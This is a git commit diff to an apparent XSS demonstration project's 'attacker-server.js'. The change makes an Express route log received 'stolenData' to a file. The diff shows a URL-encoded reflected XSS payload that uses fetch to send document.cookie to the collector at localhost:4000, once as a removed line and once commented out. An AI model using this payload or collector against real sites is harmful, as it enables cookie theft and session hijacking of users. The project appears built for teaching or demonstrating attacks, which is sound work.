18a244074c70faf5550e39508d9160ae8bad828f
dinhh <dinhhieu9301@gmail.com>
2023-10-24 21:28:41 +0700

    add log attacker

--- attacker-server.js
+++ attacker-server.js
@@ -18,9 +18,17 @@ const createStream = fs.createWriteStream("logsAttack.txt");
 createStream.end();
 
 app.get('/', function(req, res) {
-  console.log(req.query.data);
-  if (req.query.data) stolenData.push(req.query.data);
-  maliciousLink = req.query.mode == "reflected"? 'http://localhost:3000/?newReview=%3Cscript%3Efetch%28%60http%3A%2F%2Flocalhost%3A4000%3Fdata%3D%24%7Bdocument.cookie%7D%60%29%3C%2Fscript%3E' : '';
+  if (req.query.data) {
+    stolenData.push(req.query.data);
+    fs.writeFileSync("logsAttack.txt",
+    req.query.data + "\n",
+    {
+      encoding: "utf8",
+      flag: "a+",
+      mode: 0o666
+    });
+  }
+  // maliciousLink = req.query.mode == "reflected"? 'http://localhost:3000/?newReview=%3Cscript%3Efetch%28%60http%3A%2F%2Flocalhost%3A4000%3Fdata%3D%24%7Bdocument.cookie%7D%60%29%3C%2Fscript%3E' : '';
 
   res.render('index', {
     stolenData: (stolenData.length > 0 ? stolenData : ['No data, yet!']),
